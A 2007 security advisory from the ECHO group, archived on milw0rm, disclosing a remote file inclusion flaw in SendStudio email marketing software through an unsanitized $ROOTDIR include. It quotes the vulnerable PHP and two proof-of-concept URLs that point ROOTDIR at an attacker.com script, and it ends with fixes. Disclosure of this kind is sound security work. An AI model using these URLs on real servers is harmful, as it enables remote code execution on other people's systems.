@@ -1,0 +1,100 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_66$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_66$2007] SendStudio <= 2004.14 Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : Feb, 20th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv66-K-159-2007.txt
+Critical Lvl   : Dangerous
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : SendStudio 
+version       : <= 2004.14
+URL           : http://www.interspire.com/sendstudio/
+Description :
+
+SendStudio is PHP email marketing software that lets you create, send and track an unlimited number of email messages and autoresponders. Over 25,000 people are already using SendStudio to keep in touch with their subscribers.
+
+Once installed on your web server you can say goodbye to clunky, outdated desktop applications (such as Outlook) and email your subscribers using SendStudio whenever you like from where ever you like using your favorite web browser.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~~
+- Invalid include function at admin/includes/createemails.inc.php :
+
+---------------createemails.inc.php--------------------------------------
+<?php
+require_once($ROOTDIR.'admin/functions/general.php');
+
+...
+------------------------------------------------------------------
+
+- invalid include function at admin/includes/send_emails.inc.php :
+
+--------------------send_emails.inc.php--------------------------
+<?php
+
+        global $ROOTDIR;
+        include($ROOTDIR . 'admin/includes/createemails.inc.php');
+...
+
+-------------------------------------------------------------------
+
+Variables $ROOTDIR are not properly sanitized.
+When register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.
+
+
+
+Poc/Exploit:
+~~~~~~~~~~
+
+http://www.target.com/sendstudio/admin/includes/createemails.inc.php?ROOTDIR=http://attacker.com/evil?
+http://www.target.com/sendstudio/admin/includes/send_emails.inc.php?ROOTDIR=http://attacker.com/evil?
+
+
+Solution:
+~~~~~~~
+
+- Sanitize variable $ROOTDIR on affected files.
+- Turn off register_globals
+- use the lates version
+
+Notification :
+~~~~~~~~~~
+vendor was contacted
+
+---------------------------------------------------------------------------
+Shoutz:
+~~~~~
+~ ping - my dearest wife, and my little son, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-02-20]
